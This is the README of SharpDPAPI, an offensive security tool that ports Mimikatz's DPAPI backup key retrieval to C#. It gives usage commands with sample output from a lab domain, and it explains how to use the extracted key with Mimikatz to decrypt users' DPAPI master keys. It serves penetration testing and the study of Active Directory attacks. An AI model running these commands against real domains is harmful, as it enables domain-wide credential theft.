# SharpDPAPI

----

SharpDPAPI is a C# port of the DPAPI backup key retrieval logic (**lsadump::backupkeys**) from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.

**I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process.**

You will need administrative rights on the domain controller you're attempting to retrieve the DPAPI backup key for.

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SharpDPAPI is licensed under the BSD 3-Clause license.

## Usage

Retrieve the DPAPI backup key for the current DC:

    C:\Temp>SharpDPAPI.exe backupkey

      [*] Current domain controller    : PRIMARY.testlab.local
      [*] Preferred backupkey Guid     : 32d021e7-ab1c-4877-af06-80473ca3e4d8
      [*] Full preferred backupKeyName : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
      [*] Key :
                HvG1sAAAAAABAAAAAAAAAAAA...

This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:<MASTERKEY> /pvk:backupkey.pvk** module


Retrieve the DPAPI backup key for the specified DC, output to a file:

    C:\Temp>SharpDPAPI.exe backupkey server=primary.testlab.local file=backupkey.pvk

      [*] Using server                 : primary.testlab.local
      [*] Preferred backupkey Guid     : 32d021e7-ab1c-4877-af06-80473ca3e4d8
      [*] Full preferred backupKeyName : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
      [*] Backup key written to        : backupkey.pvk


## Compile Instructions

We are not planning on releasing binaries for SharpDPAPI, so you will have to compile yourself :)

SharpDPAPI has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
